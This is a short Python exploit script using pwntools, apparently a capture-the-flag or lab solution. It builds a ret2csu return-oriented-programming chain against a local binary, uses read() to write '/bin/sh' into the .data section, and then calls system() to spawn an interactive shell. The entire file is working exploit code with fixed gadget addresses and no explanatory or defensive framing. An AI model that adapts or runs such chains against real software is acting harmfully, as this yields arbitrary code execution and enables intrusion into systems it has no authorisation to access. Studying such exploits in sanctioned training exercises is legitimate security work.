from pwn import *

binary = args.BIN

e = context.binary = ELF(binary)
r = ROP(e)

## ret2csu ##
# r13 -> rdi in gadget 2
# r14 -> rsi in gadget 2
# r15 -> rdx in gadget 2
# need padding after call in gadget 2 for 6 pops and 1 align

writeable_mem = 0x00601030 # .data section

p = process(e.path)

chain = cyclic(16)
chain += p64(0x40071a)                                # gadget #1
chain += p64(0x0)                                     # rbx = 0x0
chain += p64(0x1)                                     # rbp = 0x1
chain += p64(e.got['read'])                           # r12 = e.got['read']->read()
chain += p64(0x0)                                     # r13 -> rdi = stdin = 0x0
chain += p64(writeable_mem)                           # r14 -> rsi = writable_mem
chain += p64(0x8)                                     # r15 -> rdx = 0x8
chain += p64(0x400700)                                # gadget #2
chain += cyclic(8)*7                                  # padding for after call (6 pops 8 align)

chain += p64(r.find_gadget(['pop rdi', 'ret'])[0])
chain += p64(writeable_mem)                           # rdi = writeable_mem -> '/bin/sh'
chain += p64(e.sym['system'])                         # system('/bin/sh')

p.sendline(chain)

log.info("hit enter to send '/bin/sh\0'")
pause()
p.sendline(b'/bin/sh\0')

p.interactive()
